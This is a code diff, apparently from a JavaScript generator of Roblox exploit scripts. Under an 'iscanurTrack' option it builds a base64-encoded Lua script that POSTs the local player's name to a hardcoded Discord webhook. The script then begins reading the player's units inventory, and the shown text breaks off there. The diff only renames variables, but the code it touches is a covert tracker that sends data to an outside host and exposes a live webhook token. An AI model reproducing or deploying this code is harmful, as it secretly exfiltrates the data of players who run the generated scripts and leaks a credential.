@@ -3163,18 +3163,18 @@ until success`
         } else if (option?.iscanurTrack){
           const iscanurTrackWH = "https://discord.com/api/webhooks/1420798690028687514/odwrvmr_uTsMA1A-DExl3tzNR-pnQXibmhQ-AcQPjEeZ_CFj2NfuoHYVWJ-HA6B1viD8"
           const scriptTrack = btoa(unescape(encodeURIComponent(`local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
+local LocalPlayer2 = Players.LocalPlayer
+local HttpService2 = game:GetService("HttpService")
 getgenv().Webhook = "${iscanurTrackWH}"
 local function SendWebHook()
     local msg = {
-        ['content'] = LocalPlayer.Name
+        ['content'] = LocalPlayer2.Name
     }
     request({
         Url = getgenv().Webhook,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(msg)
+        Body = HttpService2:JSONEncode(msg)
     })
 end
 local ignore = {
@@ -3183,7 +3183,7 @@ local ignore = {
     UIPadding = true,
     BuyMoreSpace = true,
 }
-local unitsFolder = LocalPlayer:WaitForChild("PlayerGui")
+local unitsFolder = LocalPlayer2:WaitForChild("PlayerGui")
     :WaitForChild("Windows")
     :WaitForChild("Units")
     :WaitForChild("Holder")
